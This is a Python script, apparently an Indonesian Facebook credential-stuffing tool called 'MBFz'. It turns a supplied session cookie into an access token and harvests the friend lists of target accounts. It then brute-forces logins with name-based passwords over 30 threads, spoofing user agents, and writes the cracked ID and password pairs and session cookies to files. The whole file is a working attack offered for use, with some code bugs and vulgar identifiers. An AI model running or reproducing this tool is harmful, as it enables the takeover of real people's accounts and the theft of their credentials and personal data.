"""
silahkan rekod untuk belajar lu
sesukamu aja mau ubah apa aja
asal contant author script
dan jangan dijual/belikan script nya
ubah aja ua nya kalo alot
"""
# * [ WARNA PRINT ] * #
try:
	m = "\x1b[0;91m"
	try:
		h = "\x1b[0;92m"
		try:
			k = "\x1b[0;93m"
			try:
				b = "\x1b[0;94m"
				try:
					u = "\x1b[0;95m"
					try:
						o = "\x1b[0;96m"
					except:pass
				except:pass
			except:pass
		except:pass
	except:pass
except:pass

# * [ MODULE PERTAMA / KEBUTUHAN ] * #
import sys,random,json,re
try:
	from os import system as sis
	try:
		from time import sleep as turu
		try:
			from datetime import datetime as det
		except:pass
	except:pass
except:pass
try:
	import requests
	from requests.exceptions import ChunkedEncodingError
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tread
except:
	print(f" [*] sedang menginstall bahan module ")
	sis(("python" if os.name == "nt" else "python3") + " -m pip install requests bs4 futures stdiomask")
	exit(f" [*] silahkan run kembali script nya. ")

# * [ CONVERT TANGGAL ] * #
convert = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = det.now().day
bln = convert[(str(det.now().month))]
thn = det.now().year

# * [ NOTE TANGGAL HARI INI ] * #
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"

# * [ STRING APPEND ] * #
id, id2, uap = [],[],[]
ups,vvv = 0,0
ok, cp = 0,0
rr = random.randint
rc = random.choice

# * [ USERAGENT RANDOM ] * #
for meki in range(2000):
	brand = rc(["HUAWEI P8max","moto g31(w)","RC608L","21121210G","Elite Octa","SM-A536B","myWX1 Plus","PMT4667_3G_RU","Lenovo YT-J706F","SH-M15"])
	ua_adblok = "Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.{} Mobile Safari/537.36 ABB/{}.{}.{}".format(str(rr(5,12)),brand,str(rr(40,113)),str(rr(4000,5000)),str(rr(10,70)),str(rr(1,3)),str(rr(0,3)),str(rr(0,9)))
	if ua_adblok in uap:pass
	else:uap.append(ua_adblok)

# * [ LOGOKU ] * #
logoku = """
 _______ ______  _______ ______
 |  |  | |_____] |______  ____/
 |  |  | |_____] |       /_____
• Multi Brute Force Zero •
"""

# * [ SOURCE LOGIN COOKIE  ] * #
def loginCookies(PukimakBangetKamuAnjink):
	sis("clear")
	cookie = input(" [?] cookie : ")
	try:
		ses = requests.Session()
		ses.headers.update({'content-type': 'application/x-www-form-urlencoded'})
		data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop('content-type')
		ses.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
		response2 = ses.get(verification_url, cookies = {'cookie': cookie}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			print(" [?] cookie anda invalid ")
			exit()
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response2)).group(1),'qr': 0,'user_code': response['user_code']}
			ses.headers.update({'origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/device?user_code={}'.format(user_code),'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop('content-type');ses.headers.pop('origin')
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cookie}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				ses.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
				data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response4)).group(1),'scope': re.search('name="scope" value="(.*?)"', str(response4)).group(1),'display': re.search('name="display" value="(.*?)"', str(response4)).group(1),'user_code': re.search('name="user_code" value="(.*?)"', str(response4)).group(1),'logger_id': re.search('name="logger_id" value="(.*?)"', str(response4)).group(1),'auth_type': re.search('name="auth_type" value="(.*?)"', str(response4)).group(1),'encrypted_post_body': re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1),'return_format[]': re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop('content-type');ses.headers.pop('origin')
				ses.headers.update({'referer': 'https://m.facebook.com/',})
				response6 = ses.get(windows_referer, cookies = {'cookie': cookie}).text
				if "Sukses!" in str(response6):
					ses.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
					response7 = ses.get(status_url, cookies = {'cookie': cookie}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					print(" [√] cookie valid ")
					sis("clear")
					open("cookie.txt","w").write(cookie);open("token.txt","w").write(access_token);utamaMenu("NgentodAsu")
				else:
					print(" [!] gagal convert ke token ")
					exit()
	except (ConnectionError, ChunkedEncodingError):
		print(" [?] koneksi anda bermasalah ")
		exit()

# * [ MENU SCRIPT MBFz ] * #
def utamaMenu(Hayyuk):
	try:sinyalmu = "koneksi anda aman/menggunakan data"
	except requests.exceptions.ConnectionError:sinyalmu = "anda sedang tidak menggunakan data/koneksi gangguan"
	try:
		cookie = {"cookie":open("cookie.txt","r").read()}
		token = open("token.txt","r").read()
	except IOError:
		sis("rm -rf cookie.txt && rm -rf token.txt")
		loginCookies("Bangke")
	try:
		ambil  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
		mberr = json.loads(ambil.text)
		try:nama = mberr["name"]
		except:nama = "-"
		try:idmu = mberr["id"]
		except:idmu = "-"
	except KeyError:
		sis("rm -rf token.txt && rm -rf cookie.txt")
		menanyakanHal("Sehat Bang")
	except requests.exceptions.ConnectionError:pass
	print(logoku)
	print()
	print(" [*] sinyal : {}".format(sinyalmu))
	print(" [*] nama : {}".format(nama))
	print(" [*] id  : {}".format(idmu))
	print()
	print(" [1] crack massal publik")
	bang = input(" [?] pilih : ")
	if bang in ["1"]:
		print(" [*] gunakan tanda + untuk menambahkan id. ")
		orang = input(" [?] masukan id : ").split("+")
		for user in orang:
			try:
				apaan = requests.Session().get(f"https://graph.facebook.com/{user}?fields=friends.limit(9999999)&access_token={token}",cookies=cookie).json()
				for x in apaan["friends"]["data"]:
					id.append(x["id"]+"|"+x["name"])
					sys.stdout.write("\r [*] sedang dump : {} ".format(x["id"]));sys.stdout.flush();turu(0.00090)
			except (KeyError,IOError):
				exit("\n [!] target tidak publik")
		print("\r [*] berhasil mengumpulkan {} ".format(len(id)))
		tanyakanSettingan("Keseringan Ngentod Ayam Ya Gitu:v")
	else:
		print(" [*] selamat tinggal ")
		exit()

# * [ SETTING SEMAUMU ] * #
def tanyakanSettingan(SeringNgentodYaAowkaowkowk):
	for kocakin in id:id2.insert(0,kocakin)
	print()
	print(" [1] mbasic.facebook.com")
	print(" [2] free.facebook.com ")
	print(" [3] m.facebook.com ")
	urlx = input(" [?] pilih : ")
	if urlx in ["1"]:url = "mbasic.facebook.com"
	elif urlx in ["2"]:url = "free.facebook.com"
	else:url = "m.facebook.com"
	listPassword(url,"Apasih Yang Gak Buat Kamu")

def listPassword(url,SokAsikYatim):
	sis("clear");print(logoku)
	print()
	with tread(max_workers=30) as HikmatEXDE:
		for koncol in id2:
			try:
				pwr = ['sayang']
				uiz = koncol.split("|")[0]
				nama = koncol.split("|")[1]
				depan = nama.split(" ")[0]
				if len(nama)<=5:
					if len(depan)<3:
						pass 
					else:
						pwr.append(depan+"123");pwr.append(depan+"12345");pwr.append(depan+"1234");pwr.append(depan+"0"+str(rr(1,9)))
				else:
					if len(depan)<3:
						pwr.append(nama)
					else:
						pwr.append(nama);pwr.append(depan+"123");pwr.append(depan+"12345");pwr.append(depan+"1234");pwr.append(depan+"0"+str(rr(1,9)))
					belakang = nama.split(" ")[1]
					if len(belakang)<3:
						pwr.append(depan+belakang)
					else:
						pwr.append(depan+belakang);pwr.append(depan+belakang+"123");pwr.append(belakang+"123");pwr.append(belakang+"1234");pwr.append(belakang+"12345");pwr.append(belakang+"0"+str(rr(1,9)))
				HikmatEXDE.submit(krekEfbi,uiz,pwr,url)
			except:
				HikmatEXDE.submit(krekEfbi,uiz,pwr,url)
	print()
	if ok != 0 or cp != 0:
		print("\n [*] hasil cp/ok {}|{} ".format(cp,ok))
		turu(3)
		exit()
	else:
		print("\n [*] ops maaf tidak ada hasil ")
		exit()
		
def krekEfbi(uiz,pwr,url):
	global ok,cp,ups,vvv
	ua = rc(uap)
	aelah = rc(["1","2","3","4","5"])
	print("\r {}  {}|{} ok|cp : {}|{} ".format(vvv,len(id2),ups,ok,cp), end = "");sys.stdout.flush()
	vvv +=1
	for pw in pwr:
		pw = pw.lower()
		try:
			link = requests.Session().get(f"https://{url}/login/?next=https%3A%2F%2F{url}%2Fgames%2F&hide_upsell=1")
			d = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
"try_number":"0",
"unrecognized_tries":"0",
"email":uiz,
"pass":pw,
"login":"Masuk",
"bi_xrwh":"0"}
			hees = {"Host": url,
"content-length": str(rr(100,200)),
"cache-control": "max-age=0",
"viewport-width": "980",
"sec-ch-ua": f'"Google Chrome";v="{str(rr(80,113))}", "Chromium";v="{str(rr(80,113))}", ";Not A Brand";v="{str(rr(20,90))}"',
"sec-ch-ua-mobile": "?1",
"sec-ch-ua-platform": '"Android"',
"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
"sec-ch-ua-full-version-list": f'"Google Chrome";v="{str(rr(80,113))}.0.{str(rr(1000,5555))}.{str(rr(10,200))}", "Chromium";v="{str(rr(80,113))}.0.{str(rr(1000,5555))}.{str(rr(10,200))}", "Not-A.Brand";v="{str(rr(10,99))}.0.0.0"',
"sec-ch-prefers-color-scheme": "light",
"upgrade-insecure-requests": "1",
"origin": "https://"+url,
"content-type": "application/x-www-form-urlencoded",
"user-agent": ua,
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "navigate",
"sec-fetch-user": "?1",
"sec-fetch-dest": "document",
"referer": f"https://{url}/login/?next=https%3A%2F%2F{url}%2Fgames%2F&hide_upsell=1",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9"}
			requests.Session().post(f'https://{url}/login/device-based/regular/login/?next=https%3A%2F%2F{url}%2Fgames%2F&refsrc=deprecated&lwv=100',headers=hees,data=d,allow_redirects=False)
			if "checkpoint" in requests.Session().cookies.get_dict().keys():
				try:
					token = open('token.txt','r').read()
					cookie = {"cookie":open('cookie.txt','r').read()}
					ttl = requests.Session().get(f'https://graph.facebook.com/{uiz}?fields=birthday&access_token={token}',cookies=cookie).json()['birthday']
					m, d, y = ttl.split('/')
					m = tete[m]
					print("\r *--> {}|{}|{} ".format(uiz,pw,ua))
					print("\r \_ ttl : {}|{}|{}".format(d,m,y))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					cp+=1
					break
				except:
					m,d,y = "","",""
				print("\r *--> {}|{}|{} ".format(uiz,pw,ua))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in requests.Session().cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in requests.Session().cookies.get_dict().items() ])
				print("\r *--> {}|{}|{} ".format(uiz,pw,kuki))
				open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+ua+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:turu(999)
	vvv-=1
	ups+=1
	
if __name__ in "__main__":
	try:
		os.mkdir("CP")
		try:
			os.mkdir("OK")
		except:pass
	except:pass
	utamaMenu("Coba Aja")
	